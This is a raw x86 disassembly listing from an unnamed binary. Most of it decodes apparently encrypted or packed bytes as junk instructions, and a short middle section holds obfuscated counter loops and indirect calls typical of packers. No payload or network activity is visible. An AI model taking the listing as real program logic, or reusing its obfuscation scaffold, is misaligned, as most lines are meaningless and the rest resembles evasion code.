  41b259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b25a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b25b:	ror    DWORD PTR [ebx+0x6d13e5a3],cl
  41b261:	adc    al,ch
  41b263:	fisttp DWORD PTR [ebp-0x53253b4f]
  41b269:	add    al,0xb0
  41b26b:	mov    ah,0xc
  41b26d:	mov    ebx,0x3784c391
  41b272:	jmp    0x284:0x19f64272
  41b279:	jecxz  0x41b253
  41b27b:	inc    ebp
  41b27c:	call   0x2f1c:0x94765e2a
  41b283:	mov    ?,eax
  41b285:	aas    
  41b286:	dec    edx
  41b287:	or     al,0x92
  41b289:	fld    st(6)
  41b28b:	nop
  41b28c:	mov    bl,0x1a
  41b28e:	xor    dl,ch
  41b290:	mov    eax,0x7d7efccc
  41b295:	aam    0x73
  41b297:	retf   
  41b298:	mov    dh,BYTE PTR [edx+0x1a]
  41b29b:	popf   
  41b29c:	sahf   
  41b29d:	(bad)  
  41b29f:	push   esi
  41b2a0:	fnstcw WORD PTR [eax+0x12]
  41b2a3:	xchg   ebp,eax
  41b2a4:	or     eax,0xcb214984
  41b2a9:	sbb    ah,BYTE PTR [edx+0x4a67e79f]
  41b2af:	inc    esi
  41b2b0:	mov    BYTE PTR [eax],ah
  41b2b2:	push   ecx
  41b2b3:	jo     0x41b2db
  41b2b5:	enter  0x9ad9,0xa6
  41b2b9:	retf   
  41b2ba:	push   ebp
  41b2bb:	adc    al,BYTE PTR [eax]
  41b2bd:	cdq    
  41b2be:	mov    ebp,0x710e4a3a
  41b2c3:	inc    ecx
  41b2c4:	xor    eax,0x3fbec6fc
  41b2c9:	inc    edx
  41b2ca:	mov    cl,0x43
  41b2cc:	push   edx
  41b2cd:	adc    ah,bh
  41b2cf:	inc    ebx
  41b2d0:	adc    DWORD PTR [ecx],0xfb007dc6
  41b2d6:	(bad)  
  41b2d7:	xchg   dl,al
  41b2d9:	push   ebp
  41b2da:	loopne 0x41b29d
  41b2dc:	mov    es,ebx
  41b2de:	fcomp  QWORD PTR [ebx+0x57]
  41b2e1:	je     0x41b273
  41b2e3:	xor    BYTE PTR [edx+0x33],0x68
  41b2e7:	sub    al,0x22
  41b2e9:	les    eax,FWORD PTR [eax+esi*4]
  41b2ec:	and    BYTE PTR [ecx+0x71ac8e16],dh
  41b2f2:	jae    0x41b2d2
  41b2f4:	sub    al,0x2e
  41b2f6:	inc    ebx
  41b2f7:	cmp    DWORD PTR [ebp-0x36c0661b],esp
  41b2fd:	in     eax,0xb5
  41b2ff:	repnz mov esi,0x3f56d8f7
  41b305:	hlt    
  41b306:	cmp    DWORD PTR [esi],ecx
  41b308:	pop    ebp
  41b309:	retf   0x5082
  41b30c:	ror    DWORD PTR [edx-0x7ef0b175],1
  41b312:	cwde   
  41b313:	mov    edi,DWORD PTR [esi]
  41b315:	lods   al,BYTE PTR ds:[esi]
  41b316:	aad    0x18
  41b318:	cld    
  41b319:	and    DWORD PTR [esi-0x261f7770],edx
  41b31f:	ret    
  41b320:	dec    ebp
  41b321:	test   al,0x55
  41b323:	popa   
  41b324:	in     eax,dx
  41b325:	mov    BYTE PTR [esi-0x50],cl
  41b328:	mov    edi,0xb30db86b
  41b32d:	mov    ds:0x5f4c7a01,eax
  41b332:	mov    ebx,0xcea5ace9
  41b337:	cmp    esi,DWORD PTR [ebx]
  41b339:	out    0x4,al
  41b33b:	shl    BYTE PTR [esi-0x761fa33],1
  41b341:	add    cl,al
  41b343:	sub    dh,BYTE PTR [ebp-0x3f5502d7]
  41b349:	sbb    edi,DWORD PTR [eax+edx*4+0x12]
  41b34d:	fs inc ebx
  41b34f:	fisub  WORD PTR [ecx-0x1]
  41b352:	inc    ebp
  41b353:	retf   
  41b354:	enter  0xa092,0x51
  41b358:	inc    esi
  41b359:	jno    0x41b35a
  41b35b:	pop    ecx
  41b35c:	sahf   
  41b35d:	lea    edx,[edx]
  41b35f:	pop    ebp
  41b360:	add    DWORD PTR [ebx-0xf],eax
  41b363:	ins    BYTE PTR es:[edi],dx
  41b364:	add    DWORD PTR [edi+0x48],ecx
  41b367:	mov    al,ds:0x88bedef8
  41b36c:	loopne 0x41b397
  41b36e:	stos   DWORD PTR es:[edi],eax
  41b36f:	imul   ecx
  41b371:	cwde   
  41b372:	pop    esi
  41b373:	adc    dh,ch
  41b375:	cmp    BYTE PTR [edi+0x21f3cf80],bh
  41b37b:	sbb    edi,edi
  41b37d:	jg     0x41b32d
  41b37f:	pop    ebp
  41b380:	mov    edx,0x89924c01
  41b385:	xor    DWORD PTR [edx],0x5b6c1ddc
  41b38b:	jbe    0x41b328
  41b38d:	pop    es
  41b38e:	xchg   esp,eax
  41b38f:	cmp    BYTE PTR [edi+0x1a522a8],bh
  41b395:	sub    edi,DWORD PTR [ebx+0x305a6baa]
  41b39b:	dec    edx
  41b39c:	test   al,0x7
  41b39e:	pop    ebx
  41b39f:	xor    ah,ah
  41b3a1:	cmp    dl,bl
  41b3a3:	xor    ah,BYTE PTR [edx-0x5629c954]
  41b3a9:	imul   BYTE PTR [esp+eax*1-0x76]
  41b3ad:	sbb    al,0x60
  41b3af:	lock out dx,al
  41b3b1:	pusha  
  41b3b2:	pop    eax
  41b3b3:	pop    ds
  41b3b4:	push   ecx
  41b3b5:	xchg   ebx,eax
  41b3b6:	mov    ebx,0x353064dc
  41b3bb:	push   esp
  41b3bc:	outs   dx,BYTE PTR ds:[esi]
  41b3bd:	cmp    DWORD PTR [edx],esi
  41b3bf:	ror    BYTE PTR [edi-0x20],1
  41b3c2:	pop    DWORD PTR [esi]
  41b3c4:	call   0x8c7d:0x4a662fe4
  41b3cb:	iret   
  41b3cc:	push   edx
  41b3cd:	ds sub esi,esp
  41b3d0:	js     0x41b3a6
  41b3d2:	lea    ebp,[ebp-0x68]
  41b3d5:	dec    edx
  41b3d6:	arpl   WORD PTR [esi-0x6a79436e],dx
  41b3dc:	fld    QWORD PTR [ebp-0x69]
  41b3df:	iret   
  41b3e0:	std    
  41b3e1:	mov    ah,dh
  41b3e3:	xchg   ebp,eax
  41b3e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3e5:	mov    dh,bl
  41b3e7:	aas    
  41b3e8:	and    DWORD PTR [eax],ebp
  41b3ea:	xlat   BYTE PTR ds:[ebx]
  41b3eb:	inc    eax
  41b3ec:	pop    ebp
  41b3ed:	loope  0x41b389
  41b3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3f0:	daa    
  41b3f1:	mov    bl,0x21
  41b3f3:	mov    ecx,0xfd5b4bba
  41b3f8:	not    DWORD PTR [ecx-0x66]
  41b3fb:	inc    ebx
  41b3fc:	jp     0x41b3da
  41b3fe:	inc    edi
  41b3ff:	mov    ?,esp
  41b401:	adc    dh,BYTE PTR [eax+ebx*2-0x5e]
  41b405:	cmp    dl,BYTE PTR [edi-0x53]
  41b408:	or     eax,0x35bee5be
  41b40d:	sbb    DWORD PTR [ecx-0x333972bb],esp
  41b413:	ret    
  41b414:	fnsavew [esi+0x77cd420b]
  41b41b:	imul   ebx,ebx,0x94d61aff
  41b421:	adc    DWORD PTR [ebx+0x3e],esp
  41b424:	stos   BYTE PTR es:[edi],al
  41b425:	sub    DWORD PTR [edi],esi
  41b427:	test   BYTE PTR [edi+0x344393bd],dl
  41b42d:	pop    esp
  41b42e:	push   cs
  41b42f:	push   edi
  41b430:	(bad)  
  41b431:	cmp    eax,0xb750a66e
  41b436:	fsub   DWORD PTR [ecx-0x2ccb0144]
  41b43c:	mov    eax,ds:0x3f0d6b7d
  41b441:	dec    edx
  41b442:	es (bad) 
  41b444:	mov    al,ds:0xf8f9850f
  41b449:	loopne 0x41b462
  41b44b:	cld    
  41b44c:	mov    ds:0xb713d19a,al
  41b451:	add    BYTE PTR [edx],ah
  41b453:	mov    ecx,0xc42dc409
  41b458:	push   ds
  41b459:	mov    dl,0x91
  41b45b:	retf   
  41b45c:	js     0x41b4ab
  41b45e:	lods   al,BYTE PTR ds:[esi]
  41b45f:	ret    0x1e63
  41b462:	bnd jl 0x41b49d
  41b465:	mov    fs,WORD PTR [ebp+0x75bbf6e2]
  41b46b:	bound  edx,QWORD PTR [ebx-0x34]
  41b46e:	pop    esi
  41b46f:	int3   
  41b470:	int    0x8e
  41b472:	adc    cl,al
  41b474:	push   0xe718417a
  41b479:	fadd   DWORD PTR [esi+0x60]
  41b47c:	inc    esp
  41b47d:	addr16 xchg edx,eax
  41b47f:	inc    esi
  41b480:	inc    ebx
  41b481:	clc    
  41b482:	inc    ebp
  41b483:	test   eax,0x37c1a6bb
  41b488:	dec    edx
  41b489:	adc    al,0x86
  41b48b:	lds    ecx,FWORD PTR [ebp-0x5325a684]
  41b491:	aas    
  41b492:	in     eax,dx
  41b493:	ins    BYTE PTR es:[edi],dx
  41b494:	jp     0x41b4d6
  41b496:	dec    esp
  41b497:	ror    al,1
  41b499:	mov    ah,0x5b
  41b49b:	shl    BYTE PTR [ecx-0x7f12c32e],0x0
  41b4a2:	mov    ss,edx
  41b4a4:	inc    ebp
  41b4a5:	sub    BYTE PTR ds:0xc410c41a,ch
  41b4ab:	les    ebp,FWORD PTR [ecx+eax*1+0x68]
  41b4af:	push   cs
  41b4b0:	hlt    
  41b4b1:	xlat   BYTE PTR ds:[ebx]
  41b4b2:	dec    edi
  41b4b3:	add    DWORD PTR [ecx-0x6a23186c],ecx
  41b4b9:	push   di
  41b4bb:	mov    eax,ds:0xf4d65a1a
  41b4c0:	xor    eax,DWORD PTR [ebx]
  41b4c2:	stos   DWORD PTR es:[edi],eax
  41b4c3:	call   0x2ca0:0xff071e8a
  41b4ca:	add    DWORD PTR [edi],esp
  41b4cc:	les    eax,FWORD PTR ds:0xcda6bb82
  41b4d2:	sub    DWORD PTR ds:0xdcb982e4,edx
  41b4d8:	xor    ah,ah
  41b4da:	sub    al,0x70
  41b4dc:	mov    ah,0x39
  41b4de:	rol    al,0xfb
  41b4e1:	mov    al,0xd8
  41b4e3:	pop    ebp
  41b4e4:	data16 jb 0x41b515
  41b4e7:	push   cs
  41b4e8:	icebp  
  41b4e9:	mov    al,0xb4
  41b4eb:	pop    ecx
  41b4ec:	pop    ebp
  41b4ed:	xchg   esp,eax
  41b4ee:	aas    
  41b4ef:	push   ebp
  41b4f0:	adc    esi,DWORD PTR [edx-0x4d8577a6]
  41b4f6:	dec    eax
  41b4f7:	repnz mov eax,0xfd562783
  41b4fd:	xchg   ecx,eax
  41b4fe:	pop    eax
  41b4ff:	stos   DWORD PTR es:[edi],eax
  41b500:	pop    ebx
  41b501:	adc    eax,0x67f33dc7
  41b506:	xchg   esp,eax
  41b507:	add    DWORD PTR [esi+0x1a],esp
  41b50a:	dec    esi
  41b50b:	aam    0x75
  41b50d:	(bad)  
  41b50e:	push   ds
  41b50f:	sub    dl,BYTE PTR [edx+0x67]
  41b512:	xor    ah,ch
  41b514:	xlat   BYTE PTR ds:[ebx]
  41b515:	dec    eax
  41b516:	push   es
  41b517:	mov    eax,ebx
  41b519:	js     0x41b4a5
  41b51b:	test   BYTE PTR [edi+0x3a8fa300],ch
  41b521:	or     ah,BYTE PTR [ecx-0x5c]
  41b524:	dec    ecx
  41b525:	ss jge 0x41b5a6
  41b528:	mov    eax,0xb4ac192f
  41b52d:	mov    ecx,0x657345c0
  41b532:	inc    ecx
  41b533:	mov    esp,0xb472d4f9
  41b538:	stos   BYTE PTR es:[edi],al
  41b539:	mov    ds:0x358ebc61,eax
  41b53e:	int3   
  41b53f:	inc    edx
  41b540:	ss dec esi
  41b542:	adc    eax,edi
  41b544:	xchg   esp,eax
  41b545:	pop    esp
  41b546:	push   edx
  41b547:	or     esp,DWORD PTR [ecx]
  41b549:	mov    dl,0xdb
  41b54b:	sbb    esp,0x92d18f7
  41b551:	loope  0x41b54f
  41b553:	mov    ah,0xfc
  41b555:	mov    ecx,DWORD PTR [ebp+0x8]
  41b558:	mov    edx,DWORD PTR [ebp-0x4c]
  41b55b:	add    ecx,edi
  41b55d:	and    ecx,edx
  41b55f:	mov    DWORD PTR [ebp-0x4c],ecx
  41b562:	mov    ecx,DWORD PTR [ebp+0x8]
  41b565:	mov    edx,DWORD PTR [ebp-0x48]
  41b568:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b56f:	mov    DWORD PTR [ebp-0x48],ecx
  41b572:	mov    ecx,DWORD PTR [ebp+0x8]
  41b575:	mov    edx,0xfa5e1524
  41b57a:	sub    edx,ecx
  41b57c:	add    edx,DWORD PTR [ebp-0x44]
  41b57f:	mov    DWORD PTR [ebp-0x44],edx
  41b582:	mov    ecx,DWORD PTR [ebp+0x8]
  41b585:	xor    ecx,eax
  41b587:	add    ecx,esi
  41b589:	jne    0x4191ae
  41b58f:	jmp    0x41b621
  41b594:	mov    ecx,DWORD PTR [ebp+0x8]
  41b597:	mov    edx,DWORD PTR [ebp-0x8]
  41b59a:	xor    ecx,eax
  41b59c:	xor    edx,eax
  41b59e:	sub    ecx,edx
  41b5a0:	sub    ecx,esi
  41b5a2:	xor    ecx,eax
  41b5a4:	mov    DWORD PTR [ebp+0x8],ecx
  41b5a7:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5aa:	mov    edx,DWORD PTR [ebp-0x58]
  41b5ad:	add    ecx,0x5708e2
  41b5b3:	imul   ecx,edx
  41b5b6:	mov    DWORD PTR [ebp-0x58],ecx
  41b5b9:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x54]
  41b5bf:	add    ecx,0x64f880
  41b5c5:	or     ecx,edx
  41b5c7:	mov    DWORD PTR [ebp-0x54],ecx
  41b5ca:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5cd:	mov    edx,DWORD PTR [ebp-0x50]
  41b5d0:	add    ecx,0x242ebf1
  41b5d6:	xor    ecx,edx
  41b5d8:	mov    DWORD PTR [ebp-0x50],ecx
  41b5db:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5de:	mov    edx,DWORD PTR [ebp-0x4c]
  41b5e1:	add    ecx,edi
  41b5e3:	and    ecx,edx
  41b5e5:	mov    DWORD PTR [ebp-0x4c],ecx
  41b5e8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5eb:	mov    edx,DWORD PTR [ebp-0x48]
  41b5ee:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b5f5:	mov    DWORD PTR [ebp-0x48],ecx
  41b5f8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5fb:	mov    edx,0xfa5e1524
  41b600:	sub    edx,ecx
  41b602:	add    edx,DWORD PTR [ebp-0x44]
  41b605:	mov    DWORD PTR [ebp-0x44],edx
  41b608:	mov    ecx,DWORD PTR [ebp+0x8]
  41b60b:	xor    ecx,eax
  41b60d:	add    ecx,esi
  41b60f:	jne    0x41b594
  41b615:	mov    ecx,DWORD PTR [ebp-0x8]
  41b618:	xor    ecx,eax
  41b61a:	mov    eax,DWORD PTR [ebp+0x10]
  41b61d:	add    ecx,esi
  41b61f:	mov    DWORD PTR [eax],ecx
  41b621:	pop    edi
  41b622:	pop    esi
  41b623:	pop    ebx
  41b624:	leave  
  41b625:	ret    0xc
  41b628:	push   ebp
  41b629:	mov    ebp,esp
  41b62b:	sub    esp,0x78
  41b62e:	push   esi
  41b62f:	mov    DWORD PTR ds:0x42b21e,0x12
  41b639:	cmp    DWORD PTR ds:0x42b21e,0x0
  41b640:	je     0x41b684
  41b646:	cmp    DWORD PTR ds:0x42b21e,0x16
  41b64d:	jle    0x41b684
  41b653:	jmp    0x41b672
  41b658:	push   0x42b1fa
  41b65d:	push   0x8597
  41b662:	push   0x42a285
  41b667:	push   0x42a1b7
  41b66c:	call   DWORD PTR ds:0x42b31e
  41b672:	mov    esi,DWORD PTR ds:0x42b21e
  41b678:	dec    esi
  41b679:	mov    DWORD PTR ds:0x42b21e,esi
  41b67f:	jmp    0x41b639
  41b684:	push   edi
  41b685:	sub    DWORD PTR ds:0x42b1ca,0x4941
  41b68f:	mov    eax,ds:0x42a472
  41b694:	xor    esi,esi
  41b696:	xor    esi,DWORD PTR ds:0x42b1d6
  41b69c:	add    esi,DWORD PTR ds:0x42b1da
  41b6a2:	mov    DWORD PTR ds:0x42b1d6,esi
  41b6a8:	mov    DWORD PTR [ebp-0x24],eax
  41b6ab:	and    DWORD PTR ds:0x42b226,edx
  41b6b1:	mov    eax,ds:0x42a592
  41b6b6:	mov    ecx,DWORD PTR ds:0x42b256
  41b6bc:	mov    ecx,DWORD PTR [ecx]
  41b6be:	xor    DWORD PTR ds:0x42b1f2,ecx
  41b6c4:	mov    DWORD PTR [ebp-0x30],eax
  41b6c7:	mov    DWORD PTR ds:0x42b1b2,0x10
  41b6d1:	cmp    DWORD PTR ds:0x42b1b2,0x0
  41b6d8:	je     0x41b70e
  41b6de:	cmp    DWORD PTR ds:0x42b1b2,0x1e
  41b6e5:	ja     0x41b70e
  41b6eb:	jmp    0x41b6fb
  41b6f0:	push   0x25ea
  41b6f5:	call   DWORD PTR ds:0x42b322
  41b6fb:	xor    eax,eax
  41b6fd:	xor    eax,DWORD PTR ds:0x42b1b2
  41b703:	dec    eax
  41b704:	mov    ds:0x42b1b2,eax
  41b709:	jmp    0x41b6d1
  41b70e:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  41b715:	and    DWORD PTR ds:0x42b21e,0x0
  41b71f:	jmp    0x41b733
  41b724:	xor    esi,esi
  41b726:	add    esi,DWORD PTR ds:0x42b21e
  41b72c:	inc    esi
  41b72d:	mov    DWORD PTR ds:0x42b21e,esi
  41b733:	cmp    DWORD PTR ds:0x42b21e,0x14
  41b73a:	jae    0x41b77c
  41b740:	cmp    DWORD PTR ds:0x42b21e,0x7
  41b747:	jl     0x41b77c
  41b74d:	jmp    0x41b75d
  41b752:	push   0x3b69
  41b757:	call   DWORD PTR ds:0x42b326
  41b75d:	cmp    DWORD PTR ds:0x42b21e,0x6
  41b764:	jne    0x41b777
  41b76a:	mov    esi,DWORD PTR ds:0x42b21e
  41b770:	inc    esi
  41b771:	mov    DWORD PTR ds:0x42b21e,esi
  41b777:	jmp    0x41b724
  41b77c:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  41b783:	or     eax,DWORD PTR ds:0x42b212
  41b789:	mov    eax,DWORD PTR [ebp-0x10]
  41b78c:	and    DWORD PTR ds:0x42b1c2,0x0
  41b796:	jmp    0x41b7aa
  41b79b:	xor    ecx,ecx
  41b79d:	or     ecx,DWORD PTR ds:0x42b1c2
  41b7a3:	inc    ecx
  41b7a4:	mov    DWORD PTR ds:0x42b1c2,ecx
  41b7aa:	cmp    DWORD PTR ds:0x42b1c2,0x16
  41b7b1:	jae    0x41b7ee
  41b7b7:	cmp    DWORD PTR ds:0x42b1c2,0x22
  41b7be:	jb     0x41b7ee
  41b7c4:	jmp    0x41b7e9
  41b7c9:	push   0x42a121
  41b7ce:	push   0x73a7
  41b7d3:	push   DWORD PTR [ebp-0x18]
  41b7d6:	push   0x5cd1
  41b7db:	push   0x2368
  41b7e0:	push   DWORD PTR [ebp-0xc]
  41b7e3:	call   DWORD PTR ds:0x42b2ea
  41b7e9:	jmp    0x41b79b
  41b7ee:	mov    ecx,DWORD PTR [ebp-0x10]
  41b7f1:	mov    DWORD PTR ds:0x42b1be,0x10
  41b7fb:	cmp    DWORD PTR ds:0x42b1be,0x0
  41b802:	je     0x41b85b
  41b808:	cmp    DWORD PTR ds:0x42b1be,0x9
  41b80f:	jle    0x41b85b
  41b815:	jmp    0x41b82f
  41b81a:	push   0x42a03d
  41b81f:	push   0x0
  41b821:	push   DWORD PTR [ebp-0xc]
  41b824:	push   0x5431
  41b829:	call   DWORD PTR ds:0x42b2ee
  41b82f:	cmp    DWORD PTR ds:0x42b1be,0xa
  41b836:	jne    0x41b849
  41b83c:	mov    edi,DWORD PTR ds:0x42b1be
  41b842:	dec    edi
  41b843:	mov    DWORD PTR ds:0x42b1be,edi
  41b849:	mov    edi,DWORD PTR ds:0x42b1be
  41b84f:	dec    edi
  41b850:	mov    DWORD PTR ds:0x42b1be,edi
  41b856:	jmp    0x41b7fb
  41b85b:	sub    eax,ecx
  41b85d:	and    esi,esi
  41b85f:	jmp    0x41dbf0
  41b864:	xchg   ch,bl
  41b866:	fdiv   st,st(3)
  41b868:	test   dl,ah
  41b86a:	xchg   BYTE PTR [edx+0x1c89e04a],dl
  41b870:	jmp    0xee4dc9d8
  41b875:	inc    DWORD PTR [eax-0x7ca1f07d]
  41b87b:	sub    DWORD PTR ds:0xb931643e,0x45
  41b882:	pop    ebx
  41b883:	pop    ds
  41b884:	add    DWORD PTR [edi],0xde5a0e6
  41b88a:	mov    eax,ds:0x5d28dabc
  41b88f:	push   eax
  41b890:	cmp    DWORD PTR [eax],ebx
  41b892:	lahf   
  41b893:	sahf   
  41b894:	dec    esi
  41b895:	mov    fs,WORD PTR [esp+edi*8-0x7c]
  41b899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b89a:	test   al,0xf2
  41b89c:	mov    dl,0x65
  41b89e:	scas   eax,DWORD PTR es:[edi]
  41b89f:	mov    al,0x31
  41b8a1:	pop    ecx
  41b8a2:	push   0xffffff83
  41b8a4:	mov    esp,cs
  41b8a6:	xchg   DWORD PTR [eax+eiz*2-0x62],edi
  41b8aa:	sti    
  41b8ab:	cs or  al,0xe
  41b8ae:	xor    esi,DWORD PTR [esi+ebx*8]
  41b8b1:	mov    eax,0x11df6f6f
  41b8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8b7:	leave  
  41b8b8:	mul    al
  41b8ba:	dec    esp
  41b8bb:	sbb    DWORD PTR [esi],0xffffffa1
  41b8be:	outs   dx,DWORD PTR ds:[esi]
  41b8bf:	out    0x5,al
  41b8c1:	and    eax,esp
  41b8c3:	ds out 0xc8,eax
  41b8c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8c7:	mov    edx,0x6ecb83a3
  41b8cc:	add    dh,BYTE PTR [eax+ecx*1]
  41b8cf:	pop    esp
  41b8d0:	mov    dl,0x22
  41b8d2:	and    ch,BYTE PTR [ebx+ecx*4]
  41b8d5:	xor    al,0x6
  41b8d7:	mov    bh,0xc2
  41b8d9:	cvttps2pi mm3,QWORD PTR [esi]
  41b8dc:	ins    DWORD PTR es:[edi],dx
  41b8dd:	fdiv   st,st(6)
  41b8df:	test   eax,0x9ca5edff
  41b8e4:	jmp    0x41b88d
  41b8e6:	cs mov ebp,0xd47cc0d4
  41b8ec:	pop    ss
  41b8ed:	retf   0x5fd1
  41b8f0:	inc    edi
  41b8f1:	test   eax,0xf428d648
  41b8f6:	cmp    DWORD PTR [bp+si],0xc7f67e29
  41b8fd:	sbb    ebx,DWORD PTR [esi+0x72c849e4]
  41b903:	ins    BYTE PTR es:[edi],dx
  41b904:	stc    
  41b905:	add    BYTE PTR [edi+0x67],bl
  41b908:	daa    
  41b909:	jg     0x41b8a9
  41b90b:	stos   BYTE PTR es:[edi],al
  41b90c:	in     al,dx
  41b90d:	mov    ds:0x11b34e78,al
  41b912:	arpl   sp,sp
  41b914:	repz (bad) 
  41b916:	push   ebx
  41b917:	jnp    0x41b8d3
  41b919:	addr16 jns 0x41b978
  41b91c:	adc    al,0xc1
  41b91e:	push   eax
  41b91f:	jns    0x41b964
  41b921:	mov    dl,0x1b
  41b923:	ror    eax,1
  41b925:	aaa    
  41b926:	xchg   esi,eax
  41b927:	dec    eax
  41b928:	addr16 sti 
  41b92a:	pop    ebp
  41b92b:	(bad)  
  41b92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b92d:	mov    ebp,0xd10808df
  41b932:	call   0x30ae:0xdac38cf
  41b939:	push   ds
  41b93a:	lods   eax,DWORD PTR ds:[esi]
  41b93b:	retf   
  41b93c:	arpl   WORD PTR [eax-0x62af0d07],dx
  41b942:	mov    ds:0xaa7f9a58,eax
  41b947:	inc    edi
  41b948:	out    0xd0,eax
  41b94a:	std    
  41b94b:	lock popf 
  41b94d:	loope  0x41b9bf
  41b94f:	xor    DWORD PTR [ebp+0x43],esi
  41b952:	dec    ebx
  41b953:	loope  0x41b996
  41b955:	mov    bh,0x3c
  41b957:	cmp    DWORD PTR [ecx],esi
  41b959:	add    bl,BYTE PTR [esi+0x182cfe3c]
  41b95f:	cdq    
  41b960:	mov    esp,0x5d9916af
  41b965:	jnp    0x41b95d
  41b967:	test   eax,0xe7c8aafb
  41b96c:	ins    DWORD PTR es:[edi],dx
  41b96d:	jp     0x41b918
  41b96f:	mov    edi,0x54d1c7d8
  41b974:	mov    esi,0xf770d637
  41b979:	pop    es
  41b97a:	mov    bl,0x78
  41b97c:	xor    BYTE PTR [edi+0x20],bh
  41b97f:	inc    esi
  41b980:	sar    ah,1
  41b982:	ret    
  41b983:	xchg   BYTE PTR [edi],ah
  41b985:	bound  ebp,QWORD PTR [esi+0x6e6e17bc]
  41b98b:	add    al,0x89
  41b98d:	lods   al,BYTE PTR ds:[esi]
  41b98e:	rcl    DWORD PTR [edx+0x73b984ae],1
  41b994:	mov    ds:0xa779a58,eax
  41b999:	lahf   
  41b99a:	adc    BYTE PTR [esp+edi*2-0x17],bh
  41b99e:	mov    DWORD PTR [eax],esp
  41b9a0:	xchg   DWORD PTR [ebp+0x75],edi
  41b9a3:	add    edi,DWORD PTR [ebx-0x66aee07d]
  41b9a9:	jle    0x41b98e
  41b9ab:	mov    ds,WORD PTR [ecx]
  41b9ad:	sub    BYTE PTR [ebx+edx*8+0x3a],ch
  41b9b1:	pop    edi
  41b9b2:	fbld   TBYTE PTR [ebx-0x305ed518]
  41b9b8:	outs   dx,BYTE PTR ds:[esi]
  41b9b9:	ficomp WORD PTR [ebx-0x3c]
  41b9bc:	cmp    DWORD PTR [esi+eiz*8-0x5ef8c083],edx
  41b9c3:	sti    
  41b9c4:	xlat   BYTE PTR ds:[ebx]
  41b9c5:	mov    ds:0x5efb0b54,eax
  41b9ca:	sahf   
  41b9cb:	pop    ss
  41b9cc:	mov    dl,0x43
  41b9ce:	pop    eax
  41b9cf:	inc    ebx
  41b9d0:	sub    DWORD PTR [edx+esi*8+0x5d],eax
  41b9d4:	sbb    bl,BYTE PTR [ebx]
  41b9d6:	lock into 
  41b9d8:	mov    edi,0x22beecb4
  41b9dd:	popa   
  41b9de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9df:	fldenv [esi+0x58]
  41b9e2:	dec    edx
  41b9e3:	xchg   edi,eax
  41b9e4:	fdiv   QWORD PTR [ebp+0x3249a26d]
  41b9ea:	sbb    cl,BYTE PTR [esi-0x3d]
  41b9ed:	int    0x48
  41b9ef:	push   ss
  41b9f0:	daa    
  41b9f1:	sar    esp,1
  41b9f3:	mov    cl,0x4e
  41b9f5:	cli    
  41b9f6:	fstp   TBYTE PTR [edx-0x3]
  41b9f9:	jns    0x41ba05
  41b9fb:	cdq    
  41b9fc:	jb     0x41b99f
  41b9fe:	fsubr  DWORD PTR [ebx]
  41ba00:	data16 int 0xe1
  41ba03:	jle    0x41ba3c
  41ba05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba06:	repz scas eax,DWORD PTR es:[edi]
  41ba08:	(bad)  
  41ba09:	lock mov ah,0x14
  41ba0c:	and    cl,BYTE PTR [esi]
  41ba0e:	lods   al,BYTE PTR ds:[esi]
  41ba0f:	lds    ebp,FWORD PTR [ebx]
  41ba11:	xchg   ebx,eax
  41ba12:	and    bl,BYTE PTR [edi+0x67]
  41ba15:	mov    ebx,0xcb4a17be
  41ba1a:	xchg   ebx,eax
  41ba1b:	push   ecx
  41ba1c:	in     al,0x62
  41ba1e:	sbb    BYTE PTR [ecx+0x7d],dl
  41ba21:	sub    BYTE PTR [ebp-0x39],ch
  41ba24:	shl    DWORD PTR [ecx+0x77],cl
  41ba27:	cmp    bl,BYTE PTR [esi]
  41ba29:	mov    al,0x54
  41ba2b:	pop    esi
  41ba2c:	push   cs
  41ba2d:	cmp    ecx,DWORD PTR [ebx-0x12395a45]
  41ba33:	stos   DWORD PTR es:[edi],eax
  41ba34:	add    BYTE PTR [edi-0x69],0x42
  41ba38:	mov    ah,0xad
  41ba3a:	cmp    ebx,DWORD PTR [esi-0x1]
  41ba3d:	push   es
  41ba3e:	out    dx,eax
  41ba3f:	mov    edi,0x241266d9
  41ba44:	call   0xa3f7:0x6447a514
  41ba4b:	adc    DWORD PTR [edx],esi
  41ba4d:	ror    DWORD PTR [edx],1
  41ba4f:	push   edi
  41ba50:	sub    al,ah
  41ba52:	pusha  
  41ba53:	xlat   BYTE PTR ds:[ebx]
  41ba54:	cmp    ah,BYTE PTR gs:[ebp-0x56]
  41ba58:	arpl   WORD PTR [ecx+0x19],bx
  41ba5b:	jmp    0xff20:0xb7e6e7d3
  41ba62:	pop    esi
  41ba63:	fcomp  QWORD PTR [ebx]
  41ba65:	jecxz  0x41ba03
  41ba67:	ss mov bh,ah
  41ba6a:	mov    BYTE PTR [ebp-0x10393e18],bl
  41ba70:	mov    ds:0x2d8f998e,al
  41ba75:	rcr    DWORD PTR [ebx+ecx*8],cl
  41ba78:	repz mov edx,ecx
  41ba7b:	xor    DWORD PTR [eax+ebp*4+0x39],ecx
  41ba7f:	pavgb  mm4,mm5
  41ba82:	fst    QWORD PTR [ecx]
  41ba84:	scas   eax,DWORD PTR es:[edi]
  41ba85:	jns    0x41bb01
  41ba87:	jo     0x41ba75
  41ba89:	scas   eax,DWORD PTR es:[edi]
  41ba8a:	sbb    cl,bh
  41ba8c:	push   0x2158d732
  41ba91:	adc    ch,BYTE PTR [ebx-0x70]
  41ba94:	out    0xe8,eax
